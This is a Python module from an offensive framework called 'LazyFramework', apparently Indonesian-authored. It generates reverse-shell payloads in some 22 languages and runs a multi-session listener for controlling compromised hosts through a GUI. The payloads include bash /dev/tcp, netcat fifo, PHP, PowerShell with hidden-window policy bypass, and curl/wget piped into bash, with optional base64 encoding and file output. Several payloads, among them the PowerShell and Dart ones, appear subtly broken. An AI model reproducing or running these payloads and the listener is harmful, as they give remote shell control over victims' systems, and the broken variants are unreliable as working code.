#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
LazyFramework - Reverse TCP Multi-Language 22+
FIXED: Session auto-detection untuk GUI PyQt6
"""

import socket
import threading
import time
import select
import base64
from rich.console import Console
from rich.panel import Panel

console = Console()

SESSIONS = {}
SESSIONS_LOCK = threading.Lock()

# ==================== WAJIB UNTUK gui.py ====================
MODULE_INFO = {
    "name": "Reverse TCP Multi-Language (22+)",
    "description": "Reverse shell 22+ bahasa + auto session detection",
    "author": "LazyFramework Indo",
    "rank": "Excellent"
}

OPTIONS = {
    "LHOST":   {"default": "0.0.0.0", "required": True},
    "LPORT":   {"default": 4444,      "required": True},
    "PAYLOAD": {"default": "python",  "required": True},
    "OUTPUT":  {"default": "",        "required": False},
    "ENCODE":  {"default": "no",      "required": False}
}
# =============================================================

def generate_payload(lhost, lport, lang):
    payloads = {
        "python": f"""import socket,os,pty,time
while True:
 try:
  s=socket.socket();s.connect(("{lhost}",{lport}))
  [os.dup2(s.fileno(),f) for f in (0,1,2)]
  pty.spawn("/bin/bash")
  s.send(b"stty raw -echo; clear\\n")
  s.send(b"export PS1=\\n")
 except: time.sleep(5)""",

        "bash": f"""bash -i >& /dev/tcp/{lhost}/{lport} 0>&1""",
        "nc": f"""rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f""",
        "php": f"""<?php set_time_limit(0);$s=fsockopen("{lhost}",{lport});$p=proc_open("/bin/sh -i",[0=>$s,1=>$s,2=>$s],$x);?>""",
        "perl": f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
        "ruby": f"""ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'""",
        "netcat": f"""nc -e /bin/sh {lhost} {lport}""",
        "powershell": f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
        "awk": f"""awk 'BEGIN {{s = "/inet/tcp/0/{lhost}/{lport}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null""",
        "java": f"""public class Reverse {{ public static void main(String[] args) {{ try {{ Runtime r = Runtime.getRuntime(); Process p = r.exec("/bin/bash"); String cmd = "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"; p.getOutputStream().write(cmd.getBytes()); p.getOutputStream().close(); }} catch(Exception e) {{}} }} }}""",
        "lua": f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}',{lport});os.execute('/bin/sh -i <&3 >&3 2>&3');" """,
        "nodejs": f"""node -e "require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')" """,
        "go": f"""echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go""",
        "wget": f"""wget -qO- http://{lhost}:{lport}/shell.sh | bash""",
        "curl": f"""curl http://{lhost}:{lport}/shell.sh | bash""",
        "telnet": f"""telnet {lhost} {lport} | /bin/sh | telnet {lhost} {lport}""",
        "socat": f"""socat TCP:{lhost}:{lport} EXEC:/bin/bash""",
        "dart": f"""dart -e 'import "dart:io";Process.start("/bin/bash", []).then((p) {{p.stdin.transform(systemEncoding.decoder).listen(print);}})'""",
        "rust": f"""use std::net::TcpStream;use std::process::Command;use std::os::unix::io::{{FromRawFd, IntoRawFd}};fn main(){{let s = TcpStream::connect("{lhost}:{lport}").unwrap();let fd = s.into_raw_fd();unsafe{{Command::new("/bin/sh").stdin(std::os::unix::io::FromRawFd::from_raw_fd(fd)).stdout(std::os::unix::io::FromRawFd::from_raw_fd(fd)).stderr(std::os::unix::io::FromRawFd::from_raw_fd(fd)).spawn().unwrap().wait().unwrap();}}}}""",
        "c": f"""#include <stdio.h>#include <sys/socket.h>#include <netinet/in.h>#include <unistd.h>int main(){{int s;struct sockaddr_in a={{AF_INET,htons({lport}),inet_addr("{lhost}")}};s=socket(AF_INET,SOCK_STREAM,0);connect(s,(struct sockaddr*)&a,sizeof(a));dup2(s,0);dup2(s,1);dup2(s,2);execl("/bin/sh","sh",0);}}""",
        "windows": f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
    }
    return payloads.get(lang.lower(), "# Payload tidak ada")

def get_local_ip():
    """Auto-detect IP yang bisa diakses dari luar (TUN/TAP, eth0, wlan0, dll)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

def safe_gui_update(gui_instance, method_name, *args):
    """Thread-safe GUI update untuk PyQt6"""
    if not gui_instance:
        return

    try:
        # PyQt6
        from PyQt6.QtCore import QTimer
        QTimer.singleShot(0, lambda: getattr(gui_instance, method_name)(*args) if hasattr(gui_instance, method_name) else None)
    except Exception as e:
        pass

def sync_sessions_with_gui(framework_session):
    """Sync sessions between reverse_tcp dan GUI"""
    try:
        gui_sessions = framework_session.get('gui_sessions', {})
        if not gui_sessions or not isinstance(gui_sessions, dict):
            return
            
        sessions_dict = gui_sessions.get('dict', {})
        sessions_lock = gui_sessions.get('lock')
        
        # Sync dari reverse_tcp ke GUI
        with SESSIONS_LOCK:
            for sess_id, sess_data in SESSIONS.items():
                if sessions_lock:
                    with sessions_lock:
                        if sess_id not in sessions_dict:
                            sessions_dict[sess_id] = sess_data
                else:
                    if sess_id not in sessions_dict:
                        sessions_dict[sess_id] = sess_data
        
        # Sync dari GUI ke reverse_tcp (jika ada session di GUI tapi tidak di reverse_tcp)
        if sessions_lock:
            with sessions_lock:
                gui_session_ids = set(sessions_dict.keys())
        else:
            gui_session_ids = set(sessions_dict.keys())
            
        reverse_session_ids = set(SESSIONS.keys())
        
        missing_in_reverse = gui_session_ids - reverse_session_ids
        
    except Exception:
        pass

def send_command_to_session_with_gui(sess_id, command, framework_session):
    """Send command via GUI session data - ALTERNATIVE METHOD"""
    # Cari session dari GUI sessions
    gui_sessions = framework_session.get('gui_sessions', {})
    if not gui_sessions:
        console.print(f"[red]❌ No GUI sessions available[/]")
        return False
        
    sessions_dict = gui_sessions.get('dict', {})
    sessions_lock = gui_sessions.get('lock')
    
    # Get session dari GUI
    if sessions_lock:
        with sessions_lock:
            session = sessions_dict.get(sess_id)
    else:
        session = sessions_dict.get(sess_id)
        
    if not session:
        console.print(f"[red]❌ Session {sess_id} not found in GUI sessions[/]")
        return False
        
    sock = session.get('socket')
    if not sock:
        console.print(f"[red]❌ No socket in GUI session {sess_id}[/]")
        return False
        
    try:
        # Send command
        full_command = command + "\n"
        bytes_sent = sock.send(full_command.encode())
        console.print(f"[green]✓ Command sent via GUI session: {command}[/]")
        return True
        
    except Exception as e:
        console.print(f"[red]❌ Send command via GUI error: {e}[/]")
        return False

def send_command_to_session(sess_id, command):
    """Kirim command ke session"""
    with SESSIONS_LOCK:
        session = SESSIONS.get(sess_id)

    if not session:
        console.print(f"[red]❌ Session {sess_id} not found in SESSIONS[/]")
        return False

    sock = session.get('socket')
    if not sock:
        console.print(f"[red]❌ No socket for session {sess_id}[/]")
        return False

    try:
        # Test if socket is still connected
        try:
            import select
            ready = select.select([], [sock], [], 0.1)
            if not ready[1]:
                console.print(f"[red]❌ Socket may be closed[/]")
                return False
        except Exception as e:
            console.print(f"[red]❌ Socket error: {e}[/]")
            return False

        # Send command
        full_command = command + "\n"
        bytes_sent = sock.send(full_command.encode())
        console.print(f"[green]✓ Command sent to {sess_id}: {command}[/]")
        return True
        
    except Exception as e:
        console.print(f"[red]❌ Send command error: {e}[/]")
        return False

def handler(client_sock, addr, framework_session):
    """Handle incoming reverse shell connections"""
    sess_id = f"{addr[0]}:{addr[1]}"
    
    # Get GUI instance from framework session
    gui_instance = framework_session.get('gui_instance')
    gui_sessions = framework_session.get('gui_sessions', {})
    
    # Session data
    session_data = {
        'id': sess_id,
        'socket': client_sock,
        'ip': addr[0],
        'port': addr[1],
        'type': 'reverse_tcp',
        'cwd': '/',
        'output': f"[*] Session {sess_id} created\nType: reverse_tcp\nSource: {addr[0]}:{addr[1]}\n\n",
        'status': 'alive',
        'created': time.strftime("%H:%M:%S")
    }

    # Simpan ke semua session storage
    with SESSIONS_LOCK:
        SESSIONS[sess_id] = session_data

    # Simpan ke GUI sessions
    if gui_sessions and isinstance(gui_sessions, dict):
        sessions_dict = gui_sessions.get('dict', {})
        sessions_lock = gui_sessions.get('lock')
        
        if sessions_lock:
            with sessions_lock:
                sessions_dict[sess_id] = session_data
        else:
            sessions_dict[sess_id] = session_data

    # Output untuk GUI
    console.print(f"\n[bold green][+] Session {sess_id} opened[/]")
    
    # Thread-safe GUI update
    safe_gui_update(gui_instance, "update_sessions_ui")
    safe_gui_update(gui_instance, "switch_to_sessions_tab")

    # Setup shell
    try:
        time.sleep(0.5)
        client_sock.send(b"echo '[*] Shell initialized successfully'\n")
        time.sleep(0.2)
        client_sock.send(b"pwd\n")
    except Exception:
        pass

    # Main handler loop
    try:
        buffer = ""
        while True:
            # Check if socket is still connected
            try:
                ready = select.select([client_sock], [], [], 1)
                if ready[0]:
                    data = client_sock.recv(1024)
                    if not data: 
                        break
                        
                    # Process received data
                    raw_output = data.decode('utf-8', errors='ignore')
                    buffer += raw_output
                    
                    # Process complete lines
                    while '\n' in buffer:
                        line, buffer = buffer.split('\n', 1)
                        line = line.strip()
                        
                        if not line:
                            continue
                            
                        # Filter out noise
                        if any(noise in line for noise in ["__CWD__:", "stty", "export TERM", "clear"]):
                            continue
                            
                        # Process CWD updates
                        if line.startswith("__CWD__:"):
                            try:
                                new_cwd = line.split(":", 1)[1].strip()
                                with SESSIONS_LOCK:
                                    if sess_id in SESSIONS:
                                        SESSIONS[sess_id]['cwd'] = new_cwd
                                continue
                            except:
                                continue
                                
                        # Normal output
                        # Update semua session storage
                        with SESSIONS_LOCK:
                            if sess_id in SESSIONS:
                                SESSIONS[sess_id]['output'] += line + "\n"
                        
                        # Update GUI
                        safe_gui_update(gui_instance, "append_session_output", sess_id, line)
                        
            except socket.error:
                break
            except Exception:
                break
                
    except Exception as e:
        console.print(f"[red]❌ Handler error: {e}[/]")
    finally:
        # Cleanup code...
        pass

def start_listener(lhost, lport, framework_session):
    """Start TCP listener"""
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((lhost, lport))
    s.listen(50)
    
    # Output penting untuk GUI
    console.print(f"[bold cyan][*] Listening {lhost}:{lport} → Multi-Language + GUI Ready![/]")
    console.print(f"[bold yellow][!] Session akan otomatis muncul di tab Sessions ketika ada koneksi[/]")
    
    try:
        while True:
            client, addr = s.accept()
            threading.Thread(
                target=handler, 
                args=(client, addr, framework_session), 
                daemon=True
            ).start()
    except KeyboardInterrupt:
        console.print("[yellow][!] Listener stopped[/]")
    except Exception as e:
        console.print(f"[red][!] Listener error: {e}[/]")
    finally:
        try:
            s.close()
        except:
            pass

def run(session, options):
    """Main module execution"""
    lhost = options.get("LHOST", "0.0.0.0")
    lport = int(options.get("LPORT", 4444))
    lang  = options.get("PAYLOAD", "python").lower()
    output = options.get("OUTPUT", "")
    encode = options.get("ENCODE", "no").lower() == "yes"

    # Simpan settings ke session untuk GUI
    session['LHOST'] = lhost
    session['LPORT'] = lport

    payload = generate_payload(lhost, lport, lang)

    if encode:
        payload = base64.b64encode(payload.encode()).decode()
        console.print("[yellow][*] Payload di-encode base64[/]")

    if output:
        ext = {
            "python": ".py", "bash": ".sh", "php": ".php", "perl": ".pl", 
            "ruby": ".rb", "powershell": ".ps1", "go": ".go", "rust": ".rs",
            "c": ".c", "java": ".java", "nodejs": ".js", "windows": ".ps1"
        }.get(lang, ".txt")
        path = output if output.endswith(ext) else output + ext
        with open(path, "w") as f:
            f.write(payload)
        console.print(f"[green][+] Payload saved → {path}[/]")

    console.print(Panel(payload, title=f"PAYLOAD {lang.upper()}", border_style="bright_blue"))

    # Start listener dalam thread terpisah
    listener_thread = threading.Thread(
        target=start_listener, 
        args=(lhost, lport, session), 
        daemon=True
    )
    listener_thread.start()
    
    console.print("[green][+] Reverse TCP listener started![/]")
    console.print("[bold yellow][!] Jalankan payload di target, session akan muncul otomatis di tab Sessions[/]")
